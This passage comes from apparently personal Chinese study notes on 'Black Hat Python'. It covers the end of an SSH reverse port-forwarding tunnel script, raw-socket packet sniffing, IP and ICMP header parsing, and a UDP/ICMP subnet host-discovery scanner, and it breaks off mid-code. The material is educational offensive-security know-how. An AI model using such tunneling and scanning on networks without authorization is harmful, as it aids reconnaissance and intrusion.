class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> g_verbose:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">chan, host, port</span>):</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((host, port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        verbose(<span class="string">&#x27;Forwarding request to %s:%d failed: %r&#x27;</span> % (host, port, e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        verbose(<span class="string">&#x27;Connected! Tunnel open %r -&gt; %r -&gt; %r&#x27;</span> % (chan.origin_addr, chan.getpeername(), (host, port)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r, w, x = select.select([sock, chan], [], [])</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">            data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chan.send(data)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">in</span> r:</span><br><span class="line">            data = chan.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.send(data)</span><br><span class="line">    chan.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    verbose(<span class="string">&#x27;Tunnel closed from %r&#x27;</span> % (chan.origin_addr, ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_forward_tunnel</span>(<span class="params">server_port, remote_host, remote_port, transport</span>):</span></span><br><span class="line">    transport.request_port_forward(<span class="string">&quot;&quot;</span>, server_port) <span class="comment"># Ask the server to forward TCP connections from a listening port on the server, across this SSH session.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chan = transport.accept(<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))</span><br><span class="line">        thr.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        thr.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    options, server, remote = parse_options() <span class="comment"># return options, (server_host, server_port), (remote_host, remote_port)</span></span><br><span class="line"></span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> options.readpass:</span><br><span class="line">        password = getpass.getpass(<span class="string">&#x27;Enter SSH password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.load_system_host_keys()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    verbose(<span class="string">&quot;Connecting to ssh host %s:%d&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect(server[<span class="number">0</span>], server[<span class="number">1</span>], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*** Failed to connect to %s:%d: %r&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        verbose(<span class="string">&quot;Now forwarding remote port %d to %s:%d...&quot;</span> % (options.port, server[<span class="number">0</span>], server[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reverse_forward_tunnel(options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>], client.get_transport())</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C:c: Port forwarding stopped.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
        <category>black_hat_python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>black_hat_python</tag>
      </tags>
  </entry>
  <entry>
    <title>第 2 章 原始socket和流量嗅探</title>
    <url>/2022/06/15/%E7%AC%AC%202%20%E7%AB%A0%20%E5%8E%9F%E5%A7%8B%20socket%20%E5%92%8C%E6%B5%81%E9%87%8F%E5%97%85%E6%8E%A2/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="udp-host-discovery-tool">1. UDP Host Discovery Tool</h1>
<h2 id="windowslinux分组嗅探">1.1. Windows/Linux分组嗅探</h2>
<p>UDP来探测端口与TCP不同，攻击者发送UDP数据报给目标主机的一个或多个端口，</p>
<ul>
<li>如果目标主机不存在，那么就不会收到任何消息（废话）</li>
<li>如果目标主机存在，但是对应端口关闭，那么就会在一段时间之后收到 ICMP
消息，提示端口不可达</li>
<li>如果目标主机存在，对应端口也处于开放状态，也不会收到任何回应</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># host to listen on</span></span><br><span class="line">Host = <span class="string">&#x27;10.0.2.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>: <span class="comment"># windows</span></span><br><span class="line">        socket_protocol = socket.IPPROTO_IP</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line">    </span><br><span class="line">    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</span><br><span class="line">    sniffer.bind((Host, <span class="number">0</span>)) <span class="comment"># 端口随意</span></span><br><span class="line">    <span class="comment"># 在捕获的数据包中包含IP头</span></span><br><span class="line">    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 在Windows平台上，需要设置IOCTL以启用混杂模式</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line">    <span class="comment"># 读取单个数据包</span></span><br><span class="line">    <span class="built_in">print</span>(sniffer.recv(<span class="number">65535</span>))</span><br><span class="line">    <span class="comment"># 在Windows平台上，关闭IOCTL的混杂模式</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>: </span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>不同平台的 <code>os.name</code> 是不同的：</p>
<ol type="1">
<li><p>Windows</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614195653.png" /></p></li>
<li><p>Linux</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614195715.png" /></p></li>
</ol>
<p>Windows的IOCTL允许嗅探所有协议的分组，但Linux只能嗅探ICMP分组（根据socket对象创建的时候的参数决定）。</p>
<p>解释：</p>
<ol type="1">
<li><code>sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</code>
创建一个基于 socket_protocol 的raw socket</li>
<li><code>sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)</code>
设置为 IPPROTO_IP 即接收所有IP分组；并且必须设置 IP_HDRINCL。</li>
</ol>
<p>运行结果：（需要使用 root 权限运行！！！）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614222003.png" /></p>
<p>仅仅只是接收了分组，并没有对分组进行解码。</p>
<p>上面是ping的情况，如果不是ICMP的协议就不会嗅探：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614223214.png" /></p>
<p>如果是在Windows平台，则所有分组都能捕捉</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614223244.png" /></p>
<p>（我都还没有ping就已经捕捉了）</p>
<h2 id="解析ip头部">1.2. 解析IP头部</h2>
<p>根据上一小节的分析，现在已经可以捕捉任何协议的IP分组了，但是捕捉到的分组是二进制的，难以理解。因此，下一步的工作就是解析IP分组中的IP头部，提取出IP头部的字段信息。首先看一下IP协议的头部的样子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614223833.png" /></p>
<p>我们需要做的就是提取协议类型、源IP和目标IP。这意味着我们需要直接在二进制中分离出各个字段。在python中，可以使用
<code>ctypes</code> 或者 <code>struct</code> 模块。前者它为基于 C
的语言提供了一座桥梁，使你能够使用与 C
兼容的数据类型并在共享库中调用函数。后者在 Python 值和以 Python
字节对象表示的 C 结构之间进行转换。换句话说，<code>ctypes</code>
模块除了处理二进制数据类型外，还提供了很多其他功能，而
<code>struct</code> 模块主要处理二进制数据。</p>
<p>编写如下用来解析IP头部的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建IP头部</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, buff=<span class="literal">None</span></span>):</span></span><br><span class="line">        header = struct.unpack(<span class="string">&#x27;&lt;BBHHHBBH4s4s&#x27;</span>, buff)</span><br><span class="line">        self.ver = header[<span class="number">0</span>] &gt;&gt; <span class="number">4</span></span><br><span class="line">        self.ihl = header[<span class="number">0</span>] &amp; <span class="number">0xF</span></span><br><span class="line"></span><br><span class="line">        self.tos = header[<span class="number">1</span>]</span><br><span class="line">        self.<span class="built_in">len</span> = header[<span class="number">2</span>]</span><br><span class="line">        self.<span class="built_in">id</span> = header[<span class="number">3</span>]</span><br><span class="line">        self.flags = header[<span class="number">4</span>] &amp; <span class="number">0x7</span></span><br><span class="line">        self.offset = header[<span class="number">4</span>] &gt;&gt; <span class="number">3</span></span><br><span class="line">        self.ttl = header[<span class="number">5</span>]</span><br><span class="line">        self.protocol_num = header[<span class="number">6</span>]</span><br><span class="line">        self.<span class="built_in">sum</span> = header[<span class="number">7</span>]</span><br><span class="line">        self.src = header[<span class="number">8</span>]</span><br><span class="line">        self.dst = header[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># human readable IP address</span></span><br><span class="line">        self.src_address = ipaddress.ip_address(self.src)</span><br><span class="line">        self.dst_address = ipaddress.ip_address(self.dst)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># map protocl constants to their names</span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s No protocol for %s&quot;</span> %(e, self.protocol_num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sniff</span>(<span class="params">host</span>):</span></span><br><span class="line">    <span class="comment"># create raw socket, bin to public interface</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>: <span class="comment"># windows</span></span><br><span class="line">        socket_protocol = socket.IPPROTO_IP</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        socket_protocol = socket.IPPROTO_ICMP</span><br><span class="line">    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)</span><br><span class="line">    sniffer.bind((host, <span class="number">1</span>))</span><br><span class="line">    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            raw_packet = sniffer.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]</span><br><span class="line">            ip_header = IP(raw_packet[:<span class="number">20</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Protocol %s, src: %s -&gt; dst: %s&#x27;</span> % (ip_header.protocol, ip_header.src_address, ip_header.dst_address))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = <span class="string">&#x27;10.0.2.4&#x27;</span></span><br><span class="line">    sniff(host)</span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li>首先利用 <code>struct</code> 模块创建IP head 类。</li>
<li>在类中，调用 <code>ipaddress.ip_address</code>
将二进制的IP地址转化为字符串</li>
<li>在类中，还将得到的 protocol_num 做匹配，得到对应的 protocol 名</li>
<li>与前一个代码不同的是，这里使用了无限循环，可以一直捕捉分组</li>
</ol>
<p>在Windows上的运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220615141248.png" /></p>
<p>在Linux上的运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220615141201.png" /></p>
<h2 id="解析icmp头部">1.3. 解析ICMP头部</h2>
<blockquote>
<p>ICMP处于网络层，但在IP之上。因此ICMP数据包是在IP head之后</p>
</blockquote>
<p>ICMP分组的头部：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614232223.png" /></p>
<p>其中，ICMP目标不可达报文格式如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220615141722.png" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">import</span> ipaddress  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, buff=<span class="literal">None</span></span>):</span>  </span><br><span class="line">        header = struct.unpack(<span class="string">&#x27;&lt;BBHHHBBH4s4s&#x27;</span>, buff)  </span><br><span class="line">        self.ver = header[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>  </span><br><span class="line">        self.ihl = header[<span class="number">0</span>] &amp; <span class="number">0xF</span>  </span><br><span class="line">  </span><br><span class="line">        self.tos = header[<span class="number">1</span>]  </span><br><span class="line">        self.<span class="built_in">len</span> = header[<span class="number">2</span>]  </span><br><span class="line">        self.<span class="built_in">id</span> = header[<span class="number">3</span>]  </span><br><span class="line">        self.flags = header[<span class="number">4</span>] &amp; <span class="number">0x7</span>  </span><br><span class="line">        self.offset = header[<span class="number">4</span>] &gt;&gt; <span class="number">3</span>  </span><br><span class="line">        self.ttl = header[<span class="number">5</span>]  </span><br><span class="line">        self.protocol_num = header[<span class="number">6</span>]  </span><br><span class="line">        self.<span class="built_in">sum</span> = header[<span class="number">7</span>]  </span><br><span class="line">        self.src = header[<span class="number">8</span>]  </span><br><span class="line">        self.dst = header[<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># human readabl IP address  </span></span><br><span class="line">        self.src_address = ipaddress.ip_address(self.src)  </span><br><span class="line">        self.dst_address = ipaddress.ip_address(self.dst)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># map protocl constants to their names  </span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s No protocol for %s&quot;</span> %(e, self.protocol_num))  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建IMCP头部</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICMP</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, buff=<span class="literal">None</span></span>):</span>  </span><br><span class="line">        header = struct.unpack(<span class="string">&#x27;&lt;BBHHH&#x27;</span>, buff)  </span><br><span class="line">        self.<span class="built_in">type</span> = header[<span class="number">0</span>]  </span><br><span class="line">        self.code = header[<span class="number">1</span>]  </span><br><span class="line">        self.head_checksum = header[<span class="number">2</span>]  </span><br><span class="line">        self.unused = header[<span class="number">3</span>]  </span><br><span class="line">        self.Next_hop_MTU = header[<span class="number">4</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sniff</span>(<span class="params">host</span>):</span>  </span><br><span class="line">    <span class="comment"># create raw socket, bin to public interface  </span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>: <span class="comment"># windows  </span></span><br><span class="line">        socket_protocol = socket.IPPROTO_IP  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        socket_protocol = socket.IPPROTO_ICMP  </span><br><span class="line">    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)  </span><br><span class="line">    sniffer.bind((host, <span class="number">1</span>))  </span><br><span class="line">    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:  </span><br><span class="line">        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            raw_packet = sniffer.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]  </span><br><span class="line">            ip_header = IP(raw_packet[:<span class="number">20</span>])  </span><br><span class="line">            <span class="keyword">if</span> ip_header.protocol == <span class="string">&#x27;ICMP&#x27;</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Protocol %s, src: %s -&gt; dst: %s&#x27;</span> % (ip_header.protocol, ip_header.src_address, ip_header.dst_address))  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Version: %s&#x27;</span> % ip_header.ver)  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Head Length: <span class="subst">&#123;ip_header.ihl&#125;</span>, TTL: <span class="subst">&#123;ip_header.ttl&#125;</span>&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">                <span class="comment"># caculate where ICMP packet start, ihl=1 -&gt; 1 line -&gt; 32bits -&gt; 4bits  </span></span><br><span class="line">                offset = ip_header.ihl * <span class="number">4</span>  </span><br><span class="line">                icmp_header = ICMP(raw_packet[offset: offset+<span class="number">8</span>])  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;ICMP -&gt; Type: %s, Code: %s&#x27;</span> % (icmp_header.<span class="built_in">type</span>, icmp_header.code))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:  </span><br><span class="line">        <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:  </span><br><span class="line">            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)  </span><br><span class="line">        sys.exit(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:  </span><br><span class="line">        host = sys.argv[<span class="number">1</span>]  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        host = <span class="string">&#x27;10.0.2.4&#x27;</span>  </span><br><span class="line">    sniff(host)</span><br></pre></td></tr></table></figure>
<ul>
<li>从计算ICMP packet开始位置可以知道，IP head 之后才是ICMP packet</li>
<li>IP head中的Head Length长度的单位是4byte。IP
head一般为20byte，所以Head
Length一般为5。（一种更简单的方法，看上面的IP头部的图中，一行就是4byte，可以理解为Head
Length的单位是“1行”）</li>
</ul>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220615153907.png" /></p>
<p>首先可以看到ping的响应被正确接收，其次可以看到 ping 响应的ICMP分组的
Type 和 Code 都为0，这表示这个ICMP为 ICMP Echo——回显应答。</p>
<h2 id="子网扫描">1.4. 子网扫描</h2>
<p>往上面的代码添加一些内容，使我们能够对整个子网进行扫描。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ipaddress, os, socket, struct, sys, threading, time  </span><br><span class="line">  </span><br><span class="line">SUBNET = <span class="string">&#x27;10.0.2.0/24&#x27;</span>  </span><br><span class="line">MESSAGE = <span class="string">&#x27;PYTHONRULES!&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, buff=<span class="literal">None</span></span>):</span>  </span><br><span class="line">        header = struct.unpack(<span class="string">&#x27;&lt;BBHHHBBH4s4s&#x27;</span>, buff)  </span><br><span class="line">        self.ver = header[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>  </span><br><span class="line">        self.ihl = header[<span class="number">0</span>] &amp; <span class="number">0xF</span>  </span><br><span class="line">  </span><br><span class="line">        self.tos = header[<span class="number">1</span>]  </span><br><span class="line">        self.<span class="built_in">len</span> = header[<span class="number">2</span>]  </span><br><span class="line">        self.<span class="built_in">id</span> = header[<span class="number">3</span>]  </span><br><span class="line">        self.flags = header[<span class="number">4</span>] &amp; <span class="number">0x7</span>  </span><br><span class="line">        self.offset = header[<span class="number">4</span>] &gt;&gt; <span class="number">3</span>  </span><br><span class="line">        self.ttl = header[<span class="number">5</span>]  </span><br><span class="line">        self.protocol_num = header[<span class="number">6</span>]  </span><br><span class="line">        self.<span class="built_in">sum</span> = header[<span class="number">7</span>]  </span><br><span class="line">        self.src = header[<span class="number">8</span>]  </span><br><span class="line">        self.dst = header[<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># human readabl IP address  </span></span><br><span class="line">        self.src_address = ipaddress.ip_address(self.src)  </span><br><span class="line">        self.dst_address = ipaddress.ip_address(self.dst)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># map protocl constants to their names  </span></span><br><span class="line">        self.protocol_map = &#123;<span class="number">1</span>: <span class="string">&quot;ICMP&quot;</span>, <span class="number">6</span>: <span class="string">&quot;TCP&quot;</span>, <span class="number">17</span>: <span class="string">&quot;UDP&quot;</span>&#125;  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            self.protocol = self.protocol_map[self.protocol_num]  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s No protocol for %s&quot;</span> %(e, self.protocol_num))  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICMP</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, buff=<span class="literal">None</span></span>):</span>  </span><br><span class="line">        header = struct.unpack(<span class="string">&#x27;&lt;BBHHH&#x27;</span>, buff)  </span><br><span class="line">        self.<span class="built_in">type</span> = header[<span class="number">0</span>]  </span><br><span class="line">        self.code = header[<span class="number">1</span>]  </span><br><span class="line">        self.head_checksum = header[<span class="number">2</span>]  </span><br><span class="line">        self.unused = header[<span class="number">3</span>]  </span><br><span class="line">        self.Next_hop_MTU = header[<span class="number">4</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scanner</span>():</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host</span>):</span>  </span><br><span class="line">        self.host = host  </span><br><span class="line">        <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:  </span><br><span class="line">            socket_protocol = socket.IPPROTO_IP  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            socket_protocol = socket.IPPROTO_ICMP  </span><br><span class="line">  </span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)  </span><br><span class="line">        self.socket.bind((host, <span class="number">0</span>))  </span><br><span class="line">        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:  </span><br><span class="line">            self.socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sniff</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        hosts_up = []  </span><br><span class="line">        hosts_up.append(self.host)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">                raw_buffer = self.socket.recvfrom(<span class="number">65535</span>)[<span class="number">0</span>]  </span><br><span class="line">                ip_header = IP(raw_buffer[: <span class="number">20</span>])  </span><br><span class="line">                <span class="keyword">if</span> ip_header.protocol == <span class="string">&#x27;ICMP&#x27;</span>:  </span><br><span class="line">                    offset = ip_header.ihl * <span class="number">4</span>  </span><br><span class="line">                    icmp_header = ICMP(raw_buffer[offset: offset+<span class="number">8</span>])  </span><br><span class="line">                    <span class="keyword">if</span> icmp_header.code == <span class="number">3</span> <span class="keyword">and</span> icmp_header.<span class="built_in">type</span> == <span class="number">3</span>: <span class="comment"># type=3 and code=3 indicate target&#x27;s port unreachable  </span></span><br><span class="line">                        <span class="keyword">if</span> ipaddress.ip_address(ip_header.src_address) <span class="keyword">in</span> ipaddress.IPv4Network(SUBNET):  </span><br><span class="line">                            <span class="keyword">if</span> raw_buffer[<span class="built_in">len</span>(raw_buffer) - <span class="built_in">len</span>(MESSAGE): ] == <span class="built_in">bytes</span>(MESSAGE, <span class="string">&#x27;utf-8&#x27;</span>):  </span><br><span class="line">                                tgt = <span class="built_in">str</span>(ip_header.src_address)  </span><br><span class="line">                                <span class="keyword">if</span> tgt != self.host <span class="keyword">and</span> tgt <span class="keyword">not</span> <span class="keyword">in</span> hosts_up:  </span><br><span class="line">                                    hosts_up.append(<span class="built_in">str</span>(ip_header.src_address))  </span><br><span class="line">                                    <span class="built_in">print</span>(<span class="string">f&#x27;Host Up: <span class="subst">&#123;tgt&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="comment"># handler CTRL-C  </span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:  </span><br><span class="line">            <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:  </span><br><span class="line">                self.socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)  </span><br><span class="line">  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\nUser interrupted.&#x27;</span>)  </span><br><span class="line">            <span class="keyword">if</span> hosts_up:  </span><br><span 